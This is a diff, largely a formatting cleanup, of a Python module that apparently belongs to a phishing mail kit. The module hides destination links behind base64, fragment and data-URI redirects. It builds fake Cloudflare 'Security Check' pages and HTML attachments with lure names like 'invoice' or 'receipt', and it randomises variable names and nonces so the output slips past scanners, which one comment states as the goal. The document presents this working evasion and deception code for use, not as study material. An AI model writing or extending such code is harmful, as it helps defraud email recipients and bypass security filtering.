@@ -44,7 +44,6 @@ import re
 import base64
 import random
 import string
-import hashlib
 from urllib.parse import quote
 
 
@@ -52,11 +51,11 @@ from urllib.parse import quote
 # CONSTANTS
 # ═══════════════════════════════════════════════════════════════
 
-METHOD_PLAIN             = 0
-METHOD_PERCENT_ENCODE    = 1
-METHOD_BASE64_ENCODE     = 2
+METHOD_PLAIN = 0
+METHOD_PERCENT_ENCODE = 1
+METHOD_BASE64_ENCODE = 2
 METHOD_FRAGMENT_REDIRECT = 3
-METHOD_HTML_ATTACHMENT   = 4
+METHOD_HTML_ATTACHMENT = 4
 METHOD_CF_SECURITY_CHECK = 5
 
 METHOD_NAMES = {
@@ -70,11 +69,11 @@ METHOD_NAMES = {
 
 # Tag → method mapping for template tag resolution
 _TAG_METHOD = {
-    "[LINK]":                METHOD_PLAIN,
-    "[SF_PERCENT_ENCODE]":   METHOD_PERCENT_ENCODE,
-    "[SF_BASE64_ENCODE]":    METHOD_BASE64_ENCODE,
-    "[SF_FRAGMENT_REDIRECT]":METHOD_FRAGMENT_REDIRECT,
-    "[SF_CF_REDIRECT]":      METHOD_CF_SECURITY_CHECK,
+    "[LINK]": METHOD_PLAIN,
+    "[SF_PERCENT_ENCODE]": METHOD_PERCENT_ENCODE,
+    "[SF_BASE64_ENCODE]": METHOD_BASE64_ENCODE,
+    "[SF_FRAGMENT_REDIRECT]": METHOD_FRAGMENT_REDIRECT,
+    "[SF_CF_REDIRECT]": METHOD_CF_SECURITY_CHECK,
 }
 
 # Cloudflare-style page appearance options
@@ -116,11 +115,16 @@ _UA_POOL = [
 # HELPERS
 # ═══════════════════════════════════════════════════════════════
 
+
 def _rand_id(n=8):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
 
 def _rand_var(prefix="v"):
-    return prefix + ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
+    return prefix + "".join(
+        random.choices(string.ascii_lowercase, k=random.randint(3, 6))
+    )
+
 
 def _obfuscate_js_string(s):
     """
@@ -134,15 +138,16 @@ def _obfuscate_js_string(s):
     i = 0
     while i < len(s):
         chunk_len = random.randint(2, 8)
-        chunk = s[i:i+chunk_len]
+        chunk = s[i : i + chunk_len]
         parts.append(f'"{chunk}"')
         i += chunk_len
-    return '+'.join(parts)
+    return "+".join(parts)
 
 
 # ═══════════════════════════════════════════════════════════════
 # ENCODING METHODS
 # ═══════════════════════════════════════════════════════════════
+
 
 def encode_plain(url: str) -> str:
     """Method 0 — URL as-is."""
@@ -169,13 +174,13 @@ def encode_base64(url: str) -> str:
     var_name = _rand_var("u")
     var_dest = _rand_var("d")
     return (
-        f'<html><head><script>'
+        f"<html><head><script>"
         f'var {var_name}="{b64}";'
-        f'var {var_dest}=atob({var_name});'
-        f'window.location.replace({var_dest});'
-        f'</script>'
+        f"var {var_dest}=atob({var_name});"
+        f"window.location.replace({var_dest});"
+        f"</script>"
         f'<noscript><meta http-equiv="refresh" content="0;url={url}"></noscript>'
-        f'</head><body></body></html>'
+        f"</head><body></body></html>"
     )
 
 
@@ -192,41 +197,42 @@ def encode_fragment(url: str) -> str:
     var_u = _rand_var("u")
     nonce = _rand_id(12)
     return (
-        f'<!DOCTYPE html><html><head>'
-        f'<title>Redirecting...</title>'
-        f'<script>/*{nonce}*/'
-        f'(function(){{'
-        f'var {var_h}=window.location.hash;'
-        f'if({var_h}){{var {var_d}={var_h}.slice(1);'
-        f'try{{var {var_u}=atob({var_d});window.location.replace({var_u});}}catch(e){{'
+        f"<!DOCTYPE html><html><head>"
+        f"<title>Redirecting...</title>"
+        f"<script>/*{nonce}*/"
+        f"(function(){{"
+        f"var {var_h}=window.location.hash;"
+        f"if({var_h}){{var {var_d}={var_h}.slice(1);"
+        f"try{{var {var_u}=atob({var_d});window.location.replace({var_u});}}catch(e){{"
         f'window.location.replace(atob("{b64}"));'
-        f'}}'
+        f"}}"
         f'}}else{{window.location.replace(atob("{b64}"));}}'
-        f'}})();'
-        f'</script>'
+        f"}})();"
+        f"</script>"
         f'<noscript><meta http-equiv="refresh" content="0;url={url}"></noscript>'
-        f'</head><body></body></html>'
+        f"</head><body></body></html>"
     )
 
 
-def encode_cf_security_check(url: str, title: str = None, message: str = None,
-                               btn_label: str = None) -> str:
+def encode_cf_security_check(
+    url: str, title: str = None, message: str = None, btn_label: str = None
+) -> str:
     """
     Method 5 — Cloudflare-style 'Security Check / Please wait…' page.
     Renders a convincing security check page with a countdown and a
     'Continue to Site' button. Auto-redirects after ~3 seconds.
     Returns full HTML page string.
     """
-    title     = title     or random.choice(_CF_TITLES)
-    message   = message   or random.choice(_CF_MESSAGES)
+    title = title or random.choice(_CF_TITLES)
+    message = message or random.choice(_CF_MESSAGES)
     btn_label = btn_label or random.choice(_CF_BTN_LABELS)
-    nonce     = _rand_id(16)
-    var_c     = _rand_var("c")
-    var_t     = _rand_var("t")
-    var_u     = _rand_var("u")
-    b64_url   = base64.b64encode(url.encode()).decode()
-    ray_id    = ''.join(random.choices('0123456789abcdef', k=16))
-    colo      = random.choice(["LAX", "LHR", "AMS", "SJC", "ORD", "DFW", "MIA", "SEA"])
+    nonce = _rand_id(16)
+    var_c = _rand_var("c")
+    var_t = _rand_var("t")
+    var_u = _rand_var("u")
+    b64_url = base64.b64encode(url.encode()).decode()
+    ray_id = "".join(random.choices("0123456789abcdef", k=16))
+    colo = random.choice(["LAX", "LHR", "AMS", "SJC", "ORD", "DFW", "MIA", "SEA"])
 
     return f'''<!DOCTYPE html>
 <html lang="en">
@@ -299,10 +305,11 @@ cursor:pointer;text-decoration:none;transition:background .15s}}
 # BUILD REDIRECT ATTACHMENT
 # ═══════════════════════════════════════════════════════════════
 
+
 def build_redirect_attachment(
-    url:      str,
-    method:   int  = METHOD_CF_SECURITY_CHECK,
-    filename: str  = None,
+    url: str,
+    method: int = METHOD_CF_SECURITY_CHECK,
+    filename: str = None,
 ) -> tuple:
     """
     Build an HTML attachment that redirects to the URL.
@@ -313,11 +320,21 @@ def build_redirect_attachment(
     method 5 = Cloudflare security-check page (default)
     """
     if not filename:
-        ext  = ".html"
-        base = random.choice([
-            "document", "invoice", "report", "statement", "notification",
-            "security", "verification", "confirmation", "receipt", "info",
-        ])
+        ext = ".html"
+        base = random.choice(
+            [
+                "document",
+                "invoice",
+                "report",
+                "statement",
+                "notification",
+                "security",
+                "verification",
+                "confirmation",
+                "receipt",
+                "info",
+            ]
+        )
         suffix = _rand_id(4)
         filename = f"{base}_{suffix}{ext}"
 
@@ -330,13 +347,13 @@ def build_redirect_attachment(
     else:
         # Minimal redirect — fastest, least suspicious for basic scanners
         nonce = _rand_id(12)
-        b64   = base64.b64encode(url.encode()).decode()
+        b64 = base64.b64encode(url.encode()).decode()
         var_u = _rand_var("u")
-        html  = (
-            f'<!DOCTYPE html><html><head><!--{nonce}-->'
+        html = (
+            f"<!DOCTYPE html><html><head><!--{nonce}-->"
             f'<meta http-equiv="refresh" content="0;url={url}">'
             f'<script>var {var_u}=atob("{b64}");window.location.replace({var_u});</script>'
-            f'</head><body></body></html>'
+            f"</head><body></body></html>"
         )
 
     return html.encode("utf-8"), filename
@@ -345,6 +362,7 @@ def build_redirect_attachment(
 # ═══════════════════════════════════════════════════════════════
 # INLINE LINK ENCODER (for href= values)
 # ═══════════════════════════════════════════════════════════════
+
 
 def encode_link(url: str, method: int = METHOD_PLAIN) -> str:
     """
@@ -360,7 +378,7 @@ def encode_link(url: str, method: int = METHOD_PLAIN) -> str:
         return encode_percent(url)
     if method == METHOD_BASE64_ENCODE:
         html = encode_base64(url)
-        b64  = base64.b64encode(html.encode()).decode()
+        b64 = base64.b64encode(html.encode()).decode()
         return f"data:text/html;base64,{b64}"
     if method == METHOD_FRAGMENT_REDIRECT:
         # Fragment mode: the redirect page URL is the data URI,
@@ -371,8 +389,12 @@ def encode_link(url: str, method: int = METHOD_PLAIN) -> str:
         return f"data:text/html;base64,{b64_page}#{b64_dest}"
     if method in (METHOD_HTML_ATTACHMENT, METHOD_CF_SECURITY_CHECK):
         # For attachment methods, encode as data URI so it works inline too
-        html = encode_cf_security_check(url) if method == METHOD_CF_SECURITY_CHECK else encode_fragment(url)
-        b64  = base64.b64encode(html.encode()).decode()
+        html = (
+            encode_cf_security_check(url)
+            if method == METHOD_CF_SECURITY_CHECK
+            else encode_fragment(url)
+        )
+        b64 = base64.b64encode(html.encode()).decode()
         return f"data:text/html;base64,{b64}"
     return url
 
@@ -380,6 +402,7 @@ def encode_link(url: str, method: int = METHOD_PLAIN) -> str:
 # ═══════════════════════════════════════════════════════════════
 # TEMPLATE TAG RESOLVER
 # ═══════════════════════════════════════════════════════════════
+
 
 def resolve_link_tags(html: str, url: str, method: int = METHOD_PLAIN) -> str:
     """
